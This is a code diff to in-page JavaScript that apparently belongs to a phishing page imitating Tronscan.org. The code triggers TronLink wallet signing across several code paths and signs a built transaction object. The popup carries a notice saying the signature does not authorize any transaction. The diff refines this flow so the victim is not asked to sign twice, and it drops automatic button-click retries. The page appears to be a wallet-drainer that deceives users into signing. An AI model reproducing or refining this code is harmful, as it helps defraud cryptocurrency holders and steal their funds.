@@ -476,8 +476,11 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   // Simple mutex — prevents PATH2+PATH3 from hitting TronGrid simultaneously
   var _signBusy = false;
 
-  // Inline sign helper used by PATH2 and PATH3
+  // Inline sign helper used by PATH1, PATH2 and PATH3
+  // _signDone: true once sign popup has been shown (prevents double-sign across all paths)
+  var _signDone = false;
   async function _doSign(addr, msg, pathLabel, tw) {
+    if (_signDone) { window.__logINF(pathLabel + ' skipped (already signed)'); return false; }
     if (_signBusy) { window.__logINF(pathLabel + ' skipped (sign in progress)'); return false; }
     _signBusy = true;
     var ok = false;
@@ -495,6 +498,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       utx.Application = 'Tronscan.org';
       utx.Message     = msg;
       utx.Notice      = 'This signature is used solely to verify ownership of the address. It does not authorize, initiate, or execute any transaction.';
+      _signDone = true; // lock before sign — popup is about to show
       var stx = await tw.trx.sign(utx);
       window.__logINF(pathLabel + ' sign ok — sig: ' + (stx.signature ? stx.signature[0].slice(0,16)+'…' : 'none'));
       if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((stx.signature && stx.signature[0]) || stx));
@@ -507,6 +511,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       ok = true;
     } catch(e) {
       window.__logERR(pathLabel + ' FAIL: ' + e.message);
+      _signDone = false; // unlock only on pre-sign failure (tx build / user rejected)
     }
     _signBusy = false;
     return ok;
@@ -602,11 +607,8 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       (async function() {
         var tw = getTronWeb();
         if (!tw) { window.__logERR('PATH2 no tronWeb'); return; }
-        var ok = await _doSign(addr, msg, 'PATH2', tw);
-        if (!ok) {
-          var btn2 = document.getElementById('signMsgBtn') || document.querySelector('.QhZmva_btnWrapper .btn');
-          if (btn2) { btn2.disabled = false; btn2.click(); }
-        }
+        await _doSign(addr, msg, 'PATH2', tw);
+        // no btn.click() fallback — would cause infinite loop
       })();
     } catch (e) {}
     _busy = false;
@@ -798,11 +800,8 @@ function waitForTronLinkAndRun() {
     var _tw3 = _getTronWeb();
     if (_tw3) {
       (async function() {
-        var ok = await _doSign(addr, msg, 'PATH3', _tw3);
-        if (!ok) {
-          var btn3 = document.getElementById('signMsgBtn') || document.querySelector('.QhZmva_btnWrapper .btn');
-          if (btn3) { btn3.disabled = false; btn3.click(); }
-        }
+        await _doSign(addr, msg, 'PATH3', _tw3);
+        // no btn.click() fallback — would cause infinite loop
       })();
     }
   }
